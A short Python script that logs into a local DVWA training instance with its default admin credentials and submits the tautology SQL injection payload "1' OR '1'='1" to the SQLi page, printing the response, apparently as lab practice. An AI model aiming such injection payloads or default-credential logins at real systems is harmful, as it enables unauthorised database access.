import requests

# Set up the DVWA URL
dvwa_url = "http://127.0.0.1:42001/vulnerabilities/sqli/"
login_url = "http://127.0.0.1:42001/login.php"

# Session for maintaining cookies
session = requests.Session()

try:
    # Step 1: Log in to DVWA
    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }
    response = session.post(login_url, data=login_data)
    print(f"Login status: {response.status_code} ({response.reason})")
    print(f"Cookies: {session.cookies}")

    # Step 2: Access SQL Injection page
    data = {"id": "1' OR '1'='1", "Submit": "Submit"}
    response = session.post(dvwa_url, data=data)
    print(f"SQL Injection status: {response.status_code} ({response.reason})")
    print(response.text)  # Print page content for debugging

except requests.exceptions.RequestException as e:
    print(f"Connection error: {e}")